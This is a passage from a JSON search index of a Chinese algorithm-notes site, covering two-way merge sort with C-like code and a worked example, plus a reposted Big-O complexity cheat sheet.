\u6210\u4e00\u4e2a\u65b0\u7684\u6709\u5e8f\u8868\u3002\u5047\u8bbe\u521d\u59cb\u5e8f\u5217\u542b\u6709k\u4e2a\u8bb0\u5f55\uff0c\u9996\u5148\u5c06\u8fd9 k \u4e2a\u8bb0\u5f55\u770b\u6210 k \u4e2a\u6709\u5e8f\u7684\u5b50\u5e8f\u5217\uff0c\u6bcf\u4e2a\u5b50\u5e8f\u5217\u7684\u957f\u5ea6\u4e3a 1 \uff0c\u7136\u540e\u4e24\u4e24\u8fdb\u884c\u5f52\u5e76\uff0c\u5f97\u5230 k/2 \u4e2a\u957f\u5ea6\u4e3a 2 \uff08 k \u4e3a\u5947\u6570\u65f6\uff0c\u6700\u540e\u4e00\u4e2a\u5e8f\u5217\u7684\u957f\u5ea6\u4e3a 1 \uff09\u7684\u6709\u5e8f\u5b50\u5e8f\u5217\u3002\u6700\u540e\u5728\u6b64\u57fa\u7840\u4e0a\u518d\u8fdb\u884c\u4e24\u4e24\u5f52\u5e76\uff0c\u5982\u6b64\u91cd\u590d\u4e0b\u53bb\uff0c\u76f4\u5230\u5f97\u5230\u4e00\u4e2a\u957f\u5ea6\u4e3a k \u7684\u6709\u5e8f\u5e8f\u5217\u4e3a\u6b62\u3002\u4e0a\u8ff0\u6392\u5e8f\u65b9\u6cd5\u88ab\u79f0\u4f5c \u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u6cd5 \u3002","title":"2. \u5f52\u5e76\u6392\u5e8f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/2.%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/#21","text":"\u5f52\u5e76\u6392\u5e8f\u5c31\u662f\u5229\u7528\u5f52\u5e76\u8fc7\u7a0b\uff0c\u5f00\u59cb\u65f6\u5148\u5c06 k \u4e2a\u6570\u636e\u770b\u6210 k \u4e2a\u957f\u5ea6\u4e3a1\u7684\u5df2\u6392\u597d\u5e8f\u7684\u8868\uff0c\u5c06\u76f8\u90bb\u7684\u8868\u6210\u5bf9\u5408\u5e76\uff0c\u5f97\u5230\u957f\u5ea6\u4e3a 2 \u7684 \uff08k/2\uff09 \u4e2a\u6709\u5e8f\u8868\uff0c\u6bcf\u4e2a\u8868\u542b\u6709 2 \u4e2a\u6570\u636e;\u8fdb\u4e00\u6b65\u518d \u5c06\u76f8\u90bb\u8868\u6210\u5bf9\u5408\u5e76 \uff0c\u5f97\u5230\u957f\u5ea6\u4e3a 4 \u7684 \uff08k/4\uff09 \u4e2a\u6709\u5e8f\u8868\u2026\u2026\u5982\u6b64\u91cd\u590d\u505a\u4e0b\u53bb\uff0c\u76f4\u5230\u5c06\u6240\u6709\u6570\u636e\u5747\u5408\u5e76\u5230\u4e00\u4e2a\u957f\u5ea6\u4e3a k \u7684\u6709\u5e8f\u8868\u4e3a\u6b62\uff0c\u4ece\u800c\u5b8c\u6210\u4e86\u6392\u5e8f\u3002 \u56fe1 \u663e\u793a\u4e86\u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u7684\u8fc7\u7a0b\u3002 \\text{Figure 1. \u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u8fc7\u7a0b} \u5728 \u56fe2 \u4e2d\uff0c\u5047\u8bbe\u4f7f\u7528\u51fd\u6570 Merge() \u5c06\u4e24\u4e2a\u6709\u5e8f\u8868\u8fdb\u884c\u5f52\u5e76\u5904\u7406\uff0c\u5047\u8bbe\u5c06\u4e24\u4e2a\u5f85\u5f52\u5e76\u7684\u8868\u5206\u522b\u4fdd\u5b58\u5728\u6570\u7ec4 A \u548c B \u4e2d\uff0c\u5c06\u5176\u4e2d\u4e00\u4e2a\u7684\u6570\u636e\u5b89\u6392\u5728\u4e0b\u6807\u4ecem\u5230n\u5355\u5143\u4e2d\uff0c\u53e6\u4e00\u4e2a\u5b89\u6392\u5728\u4e0b\u6807\u4ece \uff08n+1\uff09 \u5230 h \u5355\u5143\u4e2d\uff0c\u5c06\u5f52\u5e76\u540e\u5f97\u5230\u7684\u6709\u5e8f\u8868\u5b58\u5165\u5230\u8f85\u52a9\u6570\u7ec4 C \u4e2d\u3002\u5f52\u5e76\u8fc7\u7a0b\u662f\u4f9d\u6b21\u6bd4\u8f83\u8fd9\u4e24\u4e2a\u6709\u5e8f\u8868\u4e2d\u76f8\u5e94\u7684\u6570\u636e\uff0c\u6309\u7167\u201c\u53d6\u5c0f\u201d\u539f\u5219\u590d\u5236\u5230 C \u4e2d\u3002 \\text{Figure 2. \u4e24\u4e2a\u6709\u5e8f\u8868\u7684\u5f52\u5e76\u56fe} \u51fd\u6570 Merge() \u7684\u529f\u80fd\u53ea\u662f\u5f52\u5e76\u4e24\u4e2a\u6709\u5e8f\u8868\uff0c\u5728\u8fdb\u884c\u4e8c\u8def\u5f52\u5e76\u7684\u6bcf\u4e00\u8d9f\u5f52\u5e76\u8fc7\u7a0b\u4e2d\uff0c\u80fd\u591f\u5c06\u591a\u5bf9\u76f8\u90bb\u7684\u8868\u8fdb\u884c\u5f52\u5e76\u5904\u7406\u3002\u63a5\u4e0b\u6765\u5f00\u59cb\u8ba8\u8bba\u4e00\u8d9f\u7684\u5f52\u5e76\uff0c\u5047\u8bbe\u5df2\u7ecf\u5c06\u6570\u7ec4r\u4e2d\u7684 n \u4e2a\u6570\u636e\u5206\u6210\u6210\u5bf9\u957f\u5ea6\u4e3a s \u7684\u6709\u5e8f\u8868\uff0c\u8981\u6c42\u5c06\u8fd9\u4e9b\u8868\u4e24\u4e24\u5f52\u5e76\uff0c\u5f52\u5e76\u6210\u4e00\u4e9b\u957f\u5ea6\u4e3a 2s \u7684\u6709\u5e8f\u8868\uff0c\u5e76\u628a\u7ed3\u679c\u7f6e\u5165\u8f85\u52a9\u6570\u7ec4 r2 \u4e2d\u3002\u5982\u679c n \u4e0d\u662f 2s \u7684\u6574\u6570\u500d\uff0c\u867d\u7136\u524d\u9762\u8fdb\u884c\u5f52\u5e76\u7684\u8868\u957f\u5ea6\u5747\u4e3a s \uff0c\u4f46\u662f\u6700\u540e\u8fd8\u662f\u80fd\u518d\u5269\u4e0b\u4e00\u5bf9\u957f\u5ea6\u90fd\u662f s \u7684\u8868\u3002\u5728\u8fd9\u4e2a\u65f6\u5019\uff0c\u9700\u8981\u8003\u8651\u5982\u4e0b\u4e24\u79cd\u60c5\u51b5\u3002 \u5269\u4e0b\u4e00\u4e2a\u957f\u5ea6\u4e3a s \u7684\u8868\u548c\u4e00\u4e2a\u957f\u5ea6\u5c0f\u4e8e s \u7684\u8868\uff0c\u7531\u4e8e\u4e0a\u8ff0\u7684\u5f52\u5e76\u51fd\u6570 merge() \u5e76\u4e0d\u8981\u6c42\u5f85\u5f52\u5e76\u7684\u4e24\u4e2a\u8868\u5fc5\u987b\u957f\u5ea6\u76f8\u540c\uff0c\u4ecd\u53ef\u5c06\u4e8c\u8005\u5f52\u5e76\uff0c\u53ea\u662f\u5f52\u5e76\u540e\u7684\u8868\u7684\u957f\u5ea6\u5c0f\u4e8e\u5176\u4ed6\u8868\u7684\u957f\u5ea6 2s \u3002 \u53ea\u5269\u4e0b\u4e00\u4e2a\u8868\uff0c\u5b83\u7684\u957f\u5ea6\u5c0f\u4e8e\u6216\u7b49\u4e8e s \uff0c\u7531\u4e8e\u6ca1\u6709\u53e6\u4e00\u4e2a\u8868\u4e0e\u5b83\u5f52\u5e76\uff0c\u53ea\u80fd\u5c06\u5b83\u76f4\u63a5\u590d\u5236\u5230\u6570\u7ec4 r2 \u4e2d\uff0c\u51c6\u5907\u53c2\u52a0\u4e0b\u4e00\u8d9f\u7684\u5f52\u5e76\u3002","title":"2.1. \u5f52\u5e76\u6392\u5e8f\u601d\u60f3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/2.%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/#22","text":"\u5047\u8bbe\u5c06\u4e24\u4e2a\u6709\u5e8f\u7684\u5b50\u6587\u4ef6\uff08\u76f8\u5f53\u4e8e\u8f93\u5165\u5806\uff09\u653e\u5728\u540c\u4e00\u5411\u91cf\u4e2d\u7684\u76f8\u90bb\u4f4d\u7f6e\u4e0a\uff0c\u4f4d\u7f6e\u662f r[low\u2026m] \u548c r[m+1\u2026high] \u3002\u53ef\u4ee5\u5148\u5c06\u5b83\u4eec\u5408\u5e76\u5230\u4e00\u4e2a\u5c40\u90e8\u7684\u6682\u5b58\u5411\u91cf r1 \uff08\u76f8\u5f53\u4e8e\u8f93\u51fa\u5806\uff09\u4e2d\uff0c\u5f53\u5408\u5e76\u5b8c\u6210\u540e\u5c06 r1 \u590d\u5236\u56de r[low\u2026high] \u4e2d\u3002 \u5408\u5e76\u8fc7\u7a0b \u9884\u5148\u8bbe\u7f6e 3 \u4e2a\u6307\u9488 i \u3001 j \u548c p \uff0c\u5176\u521d\u59cb\u503c\u5206\u522b\u6307\u5411\u8fd93\u4e2a\u8bb0\u5f55\u533a\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002 \u5728\u5408\u5e76\u65f6\u4f9d\u6b21\u6bd4\u8f83 r[i] \u548c r[j] \u7684\u5173\u952e\u5b57\uff0c\u5c06\u5173\u952e\u5b57\u8f83\u5c0f\u7684\u8bb0\u5f55\u590d\u5236\u5230 r1[p] \u4e2d\uff0c\u7136\u540e\u5c06\u88ab\u590d\u5236\u8bb0\u5f55\u7684\u6307\u9488 i \u6216 j \u52a0 1 \uff0c\u4ee5\u53ca\u6307\u5411\u590d\u5236\u4f4d\u7f6e\u7684\u6307\u9488 p \u52a0 1 \u3002 \u91cd\u590d\u4e0a\u8ff0\u8fc7\u7a0b\uff0c\u76f4\u5230\u4e24\u4e2a\u8f93\u5165\u7684\u5b50\u6587\u4ef6\u4e2d\u6709\u4e00\u4e2a\u5df2\u5168\u90e8\u590d\u5236\u5b8c\u6bd5\u4e3a\u6b62\uff0c\u6b64\u65f6\u5c06\u53e6\u4e00\u975e\u7a7a\u7684\u5b50\u6587\u4ef6\u4e2d\u5269\u4f59\u8bb0\u5f55\u4f9d\u6b21\u590d\u5236\u5230 r1 \u4e2d\u3002 \u52a8\u6001\u7533\u8bf7 r1 \u5728\u4e24\u8def\u5f52\u5e76\u8fc7\u7a0b\u4e2d\uff0c r1 \u662f\u52a8\u6001\u7533\u8bf7\u7684\uff0c\u56e0\u4e3a\u7533\u8bf7\u7684\u7a7a\u95f4\u4f1a\u5f88\u5927\uff0c\u6240\u4ee5\u9700\u8981\u5224\u65ad\u52a0\u5165\u7533\u8bf7\u7a7a\u95f4\u662f\u5426\u6210\u529f\u3002\u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u6cd5\u7684\u64cd\u4f5c\u76ee\u7684\u975e\u5e38\u7b80\u5355\uff0c\u53ea\u662f\u5c06\u5f85\u6392\u5e8f\u5217\u4e2d\u76f8\u90bb\u7684\u4e24\u4e2a\u6709\u5e8f\u5b50\u5e8f\u5217\u5408\u5e76\u6210\u4e00\u4e2a\u6709\u5e8f\u5e8f\u5217\u3002\u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u6cd5\u7684\u5177\u4f53\u7b97\u6cd5\u63cf\u8ff0\u5982\u4e0b\u6240\u793a\u3002 /* \u5df2\u77e5r1[low\u2026mid]\u548cr1[mid+1\u2026high]\u5206\u522b\u6309\u5173\u952e\u5b57\u6709\u5e8f\u6392\u5217 */ /* \u5c06\u5b83\u4eec\u5408\u5e76\u6210\u4e00\u4e2a\u6709\u5e8f\u5e8f\u5217\uff0c\u5b58\u653e\u5728r[low\u2026high] */ void Merge(RecordType r1[], int low, int mid, int high, RecordType r[]) { i = low; j = mid + 1; k = low; while ((i <= mid) && (j <= high)) { if (r1[i].key <= r1[j].key) { r[k] = r1[i]; ++i; } else { r[k] = r1[j]; ++j; } ++k; } while (i <= mid) { r[k] = r1[i]; k++, i++; } while (j <= high) { r[k] = r1[j]; k++; j++; } } \u5728\u5408\u5e76\u8fc7\u7a0b\u4e2d\uff0c\u4e24\u4e2a\u6709\u5e8f\u7684\u5b50\u8868\u88ab\u904d\u5386\u4e86\u4e00\u904d\uff0c\u8868\u4e2d\u7684\u6bcf\u4e00\u9879\u5747\u88ab\u590d\u5236\u4e86\u4e00\u6b21\u3002\u56e0\u6b64\uff0c\u5408\u5e76\u7684\u4ee3\u4ef7\u4e0e\u4e24\u4e2a\u6709\u5e8f\u5b50\u8868\u7684\u957f\u5ea6\u4e4b\u548c\u6210\u6b63\u6bd4\uff0c\u8be5\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a O(n) \u3002 \u53ef\u4ee5\u91c7\u7528\u9012\u5f52\u65b9\u6cd5\u5b9e\u73b0\u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\uff0c\u5177\u4f53\u63cf\u8ff0\u5982\u4e0b\u6240\u793a\u3002 /* r1[low\u2026high]\u7ecf\u8fc7\u6392\u5e8f\u540e\u653e\u5728r[low\u2026high]\u4e2d\uff0cr2[low\u2026high]\u4e3a\u8f85\u52a9\u7a7a\u95f4 */ void MergeSort(RecordType r1[], int low, int high, RecordType r[]) { RecordType* r2; r2 = (RecordType*)malloc(sizeof(RecordType) * (hight - low + 1)); if (low == high) r[low] = r1[low]; else { mid = (low + high) / 2; MergeSort(r1\uff0clow\uff0cmid, r2); MergeSort(r1\uff0cmid + 1\uff0chigh, r2); Merge(r2\uff0clow\uff0cmid\uff0chigh\uff0cr); } free(r2); }","title":"2.2. \u4e24\u8def\u5f52\u5e76\u7b97\u6cd5\u7684\u601d\u8def"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/2.%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/#23","text":"\u5b9e\u73b0\u5f52\u5e76\u6392\u5e8f\u7684\u65b9\u6cd5\u6709\u4e24\u79cd\uff0c\u5206\u522b\u662f\u81ea\u5e95\u5411\u4e0a\u548c\u81ea\u9876\u5411\u4e0b\uff0c\u5177\u4f53\u8bf4\u660e\u5982\u4e0b\u6240\u793a\u3002","title":"2.3. \u5b9e\u73b0\u5f52\u5e76\u6392\u5e8f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/2.%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/#231","text":"\u81ea\u5e95\u5411\u4e0a\u7684\u57fa\u672c\u601d\u60f3 \u81ea\u5e95\u5411\u4e0a\u7684\u57fa\u672c\u601d\u60f3\u662f\uff0c\u5f53\u7b2c 1 \u8d9f\u5f52\u5e76\u6392\u5e8f\u65f6\uff0c\u5c06\u5f85\u6392\u5e8f\u7684\u6587\u4ef6 R[1\u2026n] \u770b\u4f5c\u662f n \u4e2a\u957f\u5ea6\u4e3a 1 \u7684\u6709\u5e8f\u5b50\u6587\u4ef6\uff0c\u7136\u540e\u5c06\u8fd9\u4e9b\u5b50\u6587\u4ef6\u4e24\u4e24\u5f52\u5e76\u3002 \u5982\u679c n \u4e3a\u5076\u6570\uff0c\u5219\u5f97\u5230 n/2 \u4e2a\u957f\u5ea6\u4e3a 2 \u7684\u6709\u5e8f\u5b50\u6587\u4ef6; \u5982\u679c n \u4e3a\u5947\u6570\uff0c\u5219\u6700\u540e\u4e00\u4e2a\u5b50\u6587\u4ef6\u8f6e\u7a7a\uff08\u4e0d\u53c2\u4e0e\u5f52\u5e76\uff09\u3002 \u6240\u4ee5\u5f53\u5b8c\u6210\u672c\u8d9f\u5f52\u5e76\u540e\uff0c\u524d [lgn] \u4e2a\u6709\u5e8f\u5b50\u6587\u4ef6\u957f\u5ea6\u4e3a 2 \uff0c\u6700\u540e\u4e00\u4e2a\u5b50\u6587\u4ef6\u957f\u5ea6\u4ecd\u4e3a 1 \u3002 \u7b2c 2 \u8d9f\u5f52\u5e76\u7684\u529f\u80fd\u662f\uff0c\u5c06\u7b2c 1 \u8d9f\u5f52\u5e76\u6240\u5f97\u5230\u7684 [lgn] \u4e2a\u6709\u5e8f\u7684\u5b50\u6587\u4ef6\u5b9e\u73b0 \u4e24\u4e24\u5f52\u5e76 \u3002\u5982\u6b64\u53cd\u590d\u64cd\u4f5c\uff0c\u76f4\u5230\u6700\u540e\u5f97\u5230\u4e00\u4e2a\u957f\u5ea6\u4e3an\u7684\u6709\u5e8f\u6587\u4ef6\u4e3a\u6b62\u3002 \u4e0a\u8ff0\u6bcf\u6b21\u5f52\u5e76\u64cd\u4f5c\uff0c\u90fd\u662f\u5c06\u4e24\u4e2a\u6709\u5e8f\u7684\u5b50\u6587\u4ef6\u5408\u5e76\u6210\u4e00\u4e2a\u6709\u5e8f\u7684\u5b50\u6587\u4ef6\uff0c\u6240\u4ee5\u79f0\u5176\u4e3a\u201c\u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u201d\u3002\u7c7b\u4f3c\u5730\u8fd8\u6709 k(k>2) \u8def\u5f52\u5e76\u6392\u5e8f\u3002 \u4e00\u8d9f\u5f52\u5e76\u7b97\u6cd5 \u5728\u67d0\u8d9f\u5f52\u5e76\u4e2d\uff0c\u8bbe\u5404\u5b50\u6587\u4ef6\u957f\u5ea6\u4e3a length \uff08\u6700\u540e\u4e00\u4e2a\u5b50\u6587\u4ef6\u7684\u957f\u5ea6\u53ef\u80fd\u5c0f\u4e8e length \uff09\uff0c\u5219\u5f52\u5e76\u524d R[1\u2026n] \u4e2d\u5171\u6709 n \u4e2a\u6709\u5e8f\u7684\u5b50\u6587\u4ef6\uff1a R[1\u2026length]\uff0cR[length+1\u20262length]\uff0c\u2026\uff0cR[([n/length]\u22121)*length+1\u2026n] \u3002 \u6ce8\u610f\uff1a\u8c03\u7528\u5f52\u5e76\u64cd\u4f5c\u5c06\u76f8\u90bb\u7684\u4e00\u5bf9\u5b50\u6587\u4ef6\u8fdb\u884c\u5f52\u5e76\u65f6\uff0c\u5fc5\u987b\u5bf9\u5b50\u6587\u4ef6\u7684\u4e2a\u6570\u53ef\u80fd\u662f\u5947\u6570\u3001\u4ee5\u53ca\u6700\u540e\u4e00\u4e2a\u5b50\u6587\u4ef6\u7684\u957f\u5ea6\u5c0f\u4e8elength\u8fd9\u4e24\u79cd\u7279\u6b8a\u60c5\u51b5\u8fdb\u884c\u7279\u6b8a\u5904\u7406\u3002 \u5982\u679c\u5b50\u6587\u4ef6\u4e2a\u6570\u4e3a\u5947\u6570\uff0c\u5219\u6700\u540e\u4e00\u4e2a\u5b50\u6587\u4ef6\u65e0\u987b\u548c\u5176\u4ed6\u5b50\u6587\u4ef6\u5f52\u5e76\uff08\u5373\u672c\u8d9f\u8f6e\u7a7a\uff09\u3002 \u5982\u679c\u5b50\u6587\u4ef6\u4e2a\u6570\u4e3a\u5076\u6570\uff0c\u5219\u8981\u6ce8\u610f\u6700\u540e\u4e00\u5bf9\u5b50\u6587\u4ef6\u4e2d\u540e\u4e00\u5b50\u6587\u4ef6\u7684\u533a\u95f4\u4e0a\u754c\u662fn\u3002 \u4f7f\u7528C\u8bed\u8a00\u5b9e\u73b0\u4e00\u8d9f\u5f52\u5e76\u7b97\u6cd5\u7684\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\u6240\u793a\u3002 void MergePass(SeqList R\uff0cint length) { //\u5bf9R[1\u2026n]\u505a\u4e00\u8d9f\u5f52\u5e76\u6392\u5e8f int i; for (i = 1; i + 2 * length - 1 <= n; i = i + 2 * length) Merge(R\uff0ci\uff0ci + length - 1\uff0ci + 2 * length - 1); //\u5f52\u5e76\u957f\u5ea6\u4e3alength\u7684\u4e24\u4e2a\u76f8\u90bb\u5b50\u6587\u4ef6 if (i + length - 1 < n) //\u5c1a\u6709\u4e24\u4e2a\u5b50\u6587\u4ef6\uff0c\u5176\u4e2d\u540e\u4e00\u4e2a\u957f\u5ea6\u5c0f\u4e8elength Merge(R\uff0ci\uff0ci + length - 1\uff0cn); //\u5f52\u5e76\u6700\u540e\u4e24\u4e2a\u5b50\u6587\u4ef6 //\u6ce8\u610f\uff1a\u82e5i n\u4e14i+length-1n\u65f6\uff0c\u5219\u5269\u4f59\u4e00\u4e2a\u5b50\u6587\u4ef6\u8f6e\u7a7a\uff0c\u65e0\u987b\u5f52\u5e76 } //MergePass \u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u7b97\u6cd5 \u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u5177\u4f53\u4ee3\u7801\u7684\u7b97\u6cd5\u5982\u4e0b\u3002 void MergeSort(SeqList R) { //\u91c7\u7528\u81ea\u5e95\u5411\u4e0a\u7684\u65b9\u6cd5\uff0c\u5bf9R[1\u2026n]\u8fdb\u884c\u4e8c\u8def\u5f52\u5e76\u6392\u5e8f int length; for (length = 1; length < n; length *= 2) //\u505a\u4e24\u8d9f\u5f52\u5e76 MergePass(R\uff0clength); //\u6709\u5e8f\u6bb5\u957f\u5ea6n\u65f6\u7ec8\u6b62 } \u81ea\u5e95\u5411\u4e0a\u7684\u5f52\u5e76\u6392\u5e8f\u7b97\u6cd5\u867d\u7136\u6548\u7387\u8f83\u9ad8\uff0c\u4f46\u53ef\u8bfb\u6027\u8f83\u5dee\u3002","title":"2.3.1. \u81ea\u5e95\u5411\u4e0a\u7684\u65b9\u6cd5"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/2.%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/#232","text":"\u7528\u5206\u6cbb\u6cd5\u8fdb\u884c\u81ea\u9876\u5411\u4e0b\u7684\u7b97\u6cd5\u8bbe\u8ba1\uff0c\u8fd9\u79cd\u5f62\u5f0f\u66f4\u4e3a\u7b80\u6d01\u3002 \u5206\u6cbb\u6cd5\u76843\u4e2a\u6b65\u9aa4 \u8bbe\u5f52\u5e76\u6392\u5e8f\u7684\u5f53\u524d\u533a\u95f4\u662f R[low\u2026high] \uff0c\u5206\u6cbb\u6cd5\u76843\u4e2a\u6b65\u9aa4\u5982\u4e0b\u3002 \u5206\u89e3\uff1a\u5c06\u5f53\u524d\u533a\u95f4\u4e00\u5206\u4e3a\u4e8c\uff0c\u5373\u6c42\u5206\u88c2\u70b9\u3002 \u6c42\u89e3\uff1a\u9012\u5f52\u5730\u5bf9\u4e24\u4e2a\u5b50\u533a\u95f4 R[low..mid] \u548c R[mid+1\u2026high] \u8fdb\u884c\u5f52\u5e76\u6392\u5e8f\u3002 \u7ec4\u5408\uff1a\u5c06\u5df2\u6392\u5e8f\u7684\u4e24\u4e2a\u5b50\u533a\u95f4 R[low..mid] \u548c R[mid+1\u2026high] \u5f52\u5e76\u4e3a\u4e00\u4e2a\u6709\u5e8f\u7684\u533a\u95f4 R[low\u2026high] \u3002 \u9012\u5f52\u7684\u7ec8\u7ed3\u6761\u4ef6\uff1a\u5b50\u533a\u95f4\u957f\u5ea6\u4e3a 1 \u3002 \u5177\u4f53\u7b97\u6cd5 void MergeSortDC(SeqList R\uff0cint low\uff0cint high) { //\u7528\u5206\u6cbb\u6cd5\u5bf9R[low\u2026high]\u8fdb\u884c\u4e8c\u8def\u5f52\u5e76\u6392\u5e8f int mid; if (low < high) { //\u533a\u95f4\u957f\u5ea6\u5927\u4e8e1 mid = (low + high) / 2; //\u5206\u89e3 MergeSortDC(R\uff0clow\uff0cmid); //\u9012\u5f52\u5730\u5bf9R[low\u2026mid]\u6392\u5e8f MergeSortDC(R\uff0cmid + 1\uff0chigh); //\u9012\u5f52\u5730\u5bf9R[mid+1\u2026high]\u6392\u5e8f Merge(R\uff0clow\uff0cmid\uff0chigh); //\u7ec4\u5408\uff0c\u5c06\u4e24\u4e2a\u6709\u5e8f\u533a\u5f52\u5e76\u4e3a\u4e00\u4e2a\u6709\u5e8f\u533a } } //MergeSortDC \u4f8b\u5982\uff0c\u5df2\u77e5\u5e8f\u5217 {26,5,77,1,61,11,59,15,48,19} \u5199\u51fa\u91c7\u7528\u5f52\u5e76\u6392\u5e8f\u7b97\u6cd5\u6392\u5e8f\u7684\u6bcf\u4e00\u8d9f\u7684\u7ed3\u679c\u3002 \u5f52\u5e76\u6392\u5e8f\u5404\u8d9f\u7684\u7ed3\u679c\u5982\u4e0b\u6240\u793a\u3002 [26] [5] [77] [1] [61] [11] [59] [15] [48] [19] [5 26] [1 77] [11 61] [15 59] [19 48] [1 5 26 77 ] [11 15 59 61] [19 48] [1 5 11 15 26 59 61 77] [19 48] [1 5 11 15 19 26 48 59 61 77]","title":"2.3.2. \u81ea\u9876\u5411\u4e0b\u7684\u65b9\u6cd5"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/2.%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/#3","text":"[1] \u5f20\u73b2\u73b2. \u7b97\u6cd5\u5b66\u4e60\u4e0e\u5e94\u7528\u4ece\u5165\u95e8\u5230\u7cbe\u901a [M]. \u5317\u4eac : \u4eba\u6c11\u90ae\u7535\u51fa\u7248\u793e, 2016. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u53c2\u8003\u6587\u732e"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/3.%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6%E9%80%9F%E6%9F%A5%E8%A1%A8/","text":"\u7b97\u6cd5\u590d\u6742\u5ea6\u901f\u67e5\u8868 # \u76ee\u5f55 # \u7b97\u6cd5\u590d\u6742\u5ea6\u901f\u67e5\u8868 \u76ee\u5f55 1. \u80cc\u666f 2. Big-O Complexity Chart 3. Common Data Structure Operations 4. Array Sorting Algorithms 1. \u80cc\u666f # \u6700\u8fd1\u770b\u5230\u4e00\u7bc7\u603b\u7ed3\u7b97\u6cd5\u590d\u6742\u5ea6\u7684\u535a\u5ba2\uff0c\u539f\u4f5c\u8005Eric\u662f\u4e3a\u4e86\u9762\u8bd5\u65b9\u4fbf\u800c\u603b\u7ed3\u51fa\u4e86\u4e00\u4efd\u7b97\u6cd5\u590d\u6742\u5ea6\u901f\u67e5\u8868\uff0c\u5728\u6b64\u8f6c\u8f7d\u4e00\u4e0b\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.bigocheatsheet.com Hi there! This webpage covers the space and time Big-O complexities of common algorithms used in Computer Science. When preparing for technical interviews in the past, I found myself spending hours crawling the internet putting together the best, average, and worst case complexities for search and sorting algorithms so that I wouldn't be stumped when asked about them. Over the last few years, I've interviewed at several Silicon Valley startups, and also some bigger companies, like Google, Facebook, Yahoo, LinkedIn, and Uber, and each time that I prepared for an interview, I thought to myself \"Why hasn't someone created a nice Big-O cheat sheet?\". So, to save all of you fine folks a ton of time, I went ahead and created one. Enjoy! - Eric 2. Big-O Complexity Chart # \\text{Figure 1. Big-O Complexity Chart} 3. Common Data Structure Operations # \\text{Figure 2. Common Data Structure Operations} 4. Array Sorting Algorithms # \\text{Figure 3. Array Sorting Algorithms}","title":"3.\u7b97\u6cd5\u590d\u6742\u5ea6\u901f\u67e5\u8868"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/3.%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6%E9%80%9F%E6%9F%A5%E8%A1%A8/#_1","text":"","title":"\u7b97\u6cd5\u590d\u6742\u5ea6\u901f\u67e5\u8868"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/3.%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6%E9%80%9F%E6%9F%A5%E8%A1%A8/#_2","text":"\u7b97\u6cd5\u590d\u6742\u5ea6\u901f\u67e5\u8868 \u76ee\u5f55 1. \u80cc\u666f 2. Big-O Complexity Chart 3. Common Data Structure Operations 4. Array Sorting 